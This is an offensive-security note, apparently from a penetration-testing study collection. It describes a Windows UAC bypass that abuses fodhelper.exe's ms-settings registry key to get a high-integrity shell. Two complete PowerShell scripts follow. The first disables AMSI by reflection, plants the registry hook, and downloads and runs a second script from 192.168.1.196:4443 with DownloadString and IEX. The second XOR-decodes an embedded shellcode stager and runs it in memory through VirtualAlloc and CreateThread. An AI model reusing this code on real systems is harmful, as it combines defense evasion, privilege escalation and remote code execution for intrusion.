# Exploit fodhelper registry keys to get High integrity shell.  

You can set the value of the registry key to a powershell commmand.  Powershell -encodedcommand arearear== or whatever.  


*** Of Course you have to bypass AMSI before doing registry key settings.  Once Fodhelper.exe is launched you will have high integrity shell ***

``` powershell

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe â€“Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe

``` 



## Completed scritpts fodhelper.ps1 and runner.ps1.  The client should download the fodhelper.ps1 which will setup registry and download runner.ps1 with fodhelper / meow.exe to execute as admin


*** Usage: (New-Object System.Net.WebClient).DownloadString('http://192.168.1.196:4443/fodhelper.ps1') | IEX ***


``` powershell

# FODHELPER.ps1

$fields = [Ref].Assembly.GetType("System.Management"+".Automation.Amsi"+"Utils").GetField("amsiInitFailed","NonPublic,Static"); $fields.SetValue($null,[System.Boolean]::"true")
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)


if (Get-Content C:\Windows\Temp\meow.exe) { del C:\windows\Temp\meow.exe } else { Write-Host "File doesnt exist" }

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value 'C:\Windows\Temp\meow.exe -NonInteractive -Command "(New-Object System.Net.WebClient).DownloadString(''http://192.168.1.196:4443/runner.ps1'') | IEX"' -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force


copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\windows\temp\meow.exe

C:\Windows\System32\fodhelper.exe


```


<br><br><br>

``` powershell

# RUNNER.ps1

function MeowFunc {

	Param ($moduleName, $functionName)

	$mytype = "Microsoft" + ".Win32." + [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VQBuAHMAYQBmAGUATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwA='))
	$systype = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA='))
	
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals("System.dll") }).GetType("Microsoft.Win32.UnsafeNativeMethods")
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
function x0r {

    param (
        $buf,
        $xorKey
    )
    [Byte[]] $xorBuf = @()
    for ($i = 0; $i -lt $buf.Length; $i++) {
    $xorByte = $buf[$i] -bxor $xorKey
    $xorBuf += [Byte]$xorByte
    }


 return $xorBuf

}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')

  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}


$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((MeowFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0x56,0xe2,0x29,0x4e,0x5a,0x42,0x66,0xaa,0xaa,0xaa,0xeb,0xfb,0xeb,0xfa,0xf8,0xe2,0x9b,0x78,0xfb,0xcf,0xe2,0x21,0xf8,0xca,0xfc,0xe2,0x21,0xf8,0xb2,0xe2,0x21,0xf8,0x8a,0xe2,0x21,0xd8,0xfa,0xe7,0x9b,0x63,0xe2,0xa5,0x1d,0xe0,0xe0,0xe2,0x9b,0x6a,0x06,0x96,0xcb,0xd6,0xa8,0x86,0x8a,0xeb,0x6b,0x63,0xa7,0xeb,0xab,0x6b,0x48,0x47,0xf8,0xe2,0x21,0xf8,0x8a,0x21,0xe8,0x96,0xe2,0xab,0x7a,0xeb,0xfb,0xcc,0x2b,0xd2,0xb2,0xa1,0xa8,0xa5,0x2f,0xd8,0xaa,0xaa,0xaa,0x21,0x2a,0x22,0xaa,0xaa,0xaa,0xe2,0x2f,0x6a,0xde,0xcd,0xe2,0xab,0x7a,0xee,0x21,0xea,0x8a,0x21,0xe2,0xb2,0xe3,0xab,0x7a,0xfa,0x49,0xfc,0xe2,0x55,0x63,0xe7,0x9b,0x63,0xeb,0x21,0x9e,0x22,0xe2,0xab,0x7c,0xe2,0x9b,0x6a,0x06,0xeb,0x6b,0x63,0xa7,0xeb,0xab,0x6b,0x92,0x4a,0xdf,0x5b,0xe6,0xa9,0xe6,0x8e,0xa2,0xef,0x93,0x7b,0xdf,0x72,0xf2,0xee,0x21,0xea,0x8e,0xe3,0xab,0x7a,0xcc,0xeb,0x21,0xa6,0xe2,0xee,0x21,0xea,0xb6,0xe3,0xab,0x7a,0xeb,0x21,0xae,0x22,0xe2,0xab,0x7a,0xeb,0xf2,0xeb,0xf2,0xf4,0xf3,0xf0,0xeb,0xf2,0xeb,0xf3,0xeb,0xf0,0xe2,0x29,0x46,0x8a,0xeb,0xf8,0x55,0x4a,0xf2,0xeb,0xf3,0xf0,0xe2,0x21,0xb8,0x43,0xe1,0x55,0x55,0x55,0xf7,0xe2,0x9b,0x71,0xf9,0xe3,0x14,0xdd,0xc3,0xc4,0xc3,0xc4,0xcf,0xde,0xaa,0xeb,0xfc,0xe2,0x23,0x4b,0xe3,0x6d,0x68,0xe6,0xdd,0x8c,0xad,0x55,0x7f,0xf9,0xf9,0x42,0xdc,0xaa,0xaa,0xaa,0xe7,0xc5,0xd0,0xc3,0xc6,0xc6,0xcb,0x85,0x9f,0x84,0x9a,0x8a,0x82,0xe7,0xcb,0xc9,0xc3,0xc4,0xde,0xc5,0xd9,0xc2,0x91,0x8a,0xe3,0xc4,0xde,0xcf,0xc6,0x8a,0xe7,0xcb,0xc9,0x8a,0xe5,0xf9,0x8a,0xf2,0x8a,0x9b,0x9a,0xf5,0x9b,0x9f,0xf5,0x9d,0x83,0x8a,0xeb,0xda,0xda,0xc6,0xcf,0xfd,0xcf,0xc8,0xe1,0xc3,0xde,0x85,0x9f,0x99,0x9d,0x84,0x99,0x9c,0x8a,0x82,0xe1,0xe2,0xfe,0xe7,0xe6,0x86,0x8a,0xc6,0xc3,0xc1,0xcf,0x8a,0xed,0xcf,0xc9,0xc1,0xc5,0x83,0x8a,0xe9,0xc2,0xd8,0xc5,0xc7,0xcf,0x85,0x9b,0x99,0x9b,0x84,0x9a,0x84,0x9a,0x84,0x9a,0x8a,0xf9,0xcb,0xcc,0xcb,0xd8,0xc3,0x85,0x9f,0x99,0x9d,0x84,0x99,0x9c,0xaa,0xf3,0xf9,0xf0,0xe7,0x9b,0x6a,0xe7,0x9b,0x63,0xf9,0xf9,0xe3,0x10,0x90,0xfc,0xd3,0x0d,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0x42,0xa4,0xaa,0xaa,0xaa,0x9b,0x93,0x98,0x84,0x9b,0x9c,0x92,0x84,0x9b,0x84,0x9b,0x93,0x9c,0xaa,0xf0,0xe2,0x23,0x6b,0xe3,0x6d,0x6a,0x56,0x8a,0xaa,0xaa,0xe7,0x9b,0x63,0xf9,0xf9,0xc0,0xa9,0xf9,0xe3,0x10,0xfd,0x23,0x35,0x6c,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0x42,0x11,0xaa,0xaa,0xaa,0x85,0x93,0x9b,0xda,0xf0,0xeb,0xe7,0xcc,0xd8,0xf9,0xc0,0xe9,0xcd,0xcc,0x9c,0xec,0x93,0xd3,0xe4,0xd0,0xc0,0xde,0xeb,0xe5,0xed,0xd3,0x9d,0x9f,0xf2,0xe1,0xcf,0xe1,0xde,0xc9,0xef,0xc2,0xe9,0xf9,0xc8,0xe9,0x99,0xe4,0xc4,0xdf,0xc4,0xfb,0xec,0xfd,0xff,0xfd,0xdc,0xe4,0xf0,0xcb,0x9a,0xd9,0xe6,0xc6,0xc6,0x99,0xff,0xc0,0xe0,0xfc,0x87,0xe9,0xe9,0xe2,0xe1,0x9e,0xf8,0xe0,0xe3,0xcd,0xc7,0xdf,0xf3,0x93,0x9b,0xd3,0xc0,0xcc,0xe5,0x92,0xce,0xe2,0xc3,0xdd,0x9b,0xd9,0xf8,0xff,0x9e,0xd2,0xe8,0xef,0xe9,0xfe,0xfe,0xdf,0xce,0xc1,0xcc,0xf3,0xe3,0x87,0xcd,0xd0,0xc3,0x9a,0xe4,0xc1,0xe5,0xf3,0xc2,0xeb,0xf3,0xc7,0xe1,0xde,0xed,0xd9,0xeb,0xe2,0xcd,0xdc,0xe3,0xfa,0xed,0xe7,0xe9,0x87,0xc2,0x92,0xc6,0xfa,0x87,0xe9,0xda,0xdf,0xe4,0xd9,0xff,0x9a,0xcb,0xfc,0xfd,0xe3,0xfa,0xc4,0xe5,0xec,0xf3,0xc9,0xdd,0xe3,0xe2,0xe9,0xf3,0xff,0xe3,0xed,0xcb,0xe5,0x9d,0xc4,0xce,0xd2,0x98,0x9e,0xc6,0xd8,0xef,0xdb,0xe0,0xc2,0x92,0x9d,0xdd,0xe5,0x9c,0x98,0xef,0x98,0xd8,0xfd,0xaa,0xe2,0x23,0x6b,0xf9,0xf0,0xeb,0xf2,0xe7,0x9b,0x63,0xf9,0xe2,0x12,0xaa,0x98,0x02,0x2e,0xaa,0xaa,0xaa,0xaa,0xfa,0xf9,0xf9,0xe3,0x6d,0x68,0x41,0xff,0x84,0x91,0x55,0x7f,0xe2,0x23,0x6c,0xc0,0xa0,0xf5,0xe2,0x23,0x5b,0xc0,0xb5,0xf0,0xf8,0xc2,0x2a,0x99,0xaa,0xaa,0xe3,0x23,0x4a,0xc0,0xae,0xeb,0xf3,0xe3,0x10,0xdf,0xec,0x34,0x2c,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe7,0x9b,0x6a,0xf9,0xf0,0xe2,0x23,0x5b,0xe7,0x9b,0x63,0xe7,0x9b,0x63,0xf9,0xf9,0xe3,0x6d,0x68,0x87,0xac,0xb2,0xd1,0x55,0x7f,0x2f,0x6a,0xdf,0xb5,0xe2,0x6d,0x6b,0x22,0xb9,0xaa,0xaa,0xe3,0x10,0xee,0x5a,0x9f,0x4a,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe2,0x55,0x65,0xde,0xa8,0x41,0x00,0x42,0xff,0xaa,0xaa,0xaa,0xf9,0xf3,0xc0,0xea,0xf0,0xe3,0x23,0x7b,0x6b,0x48,0xba,0xe3,0x6d,0x6a,0xaa,0xba,0xaa,0xaa,0xe3,0x10,0xf2,0x0e,0xf9,0x4f,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe2,0x39,0xf9,0xf9,0xe2,0x23,0x4d,0xe2,0x23,0x5b,0xe2,0x23,0x70,0xe3,0x6d,0x6a,0xaa,0x8a,0xaa,0xaa,0xe3,0x23,0x53,0xe3,0x10,0xb8,0x3c,0x23,0x48,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe2,0x29,0x6e,0x8a,0x2f,0x6a,0xde,0x18,0xcc,0x21,0xad,0xe2,0xab,0x69,0x2f,0x6a,0xdf,0x78,0xf2,0x69,0xf2,0xc0,0xaa,0xf3,0xe3,0x6d,0x68,0x5a,0x1f,0x08,0xfc,0x55,0x7f

$xb = x0r -buf $buf -xorKey 0xAA

[System.Runtime.InteropServices.Marshal]::Copy($xb, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((MeowFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

$temp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((MeowFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int])))

$temp.Invoke($hThread, 0xFFFFFFFF)

```
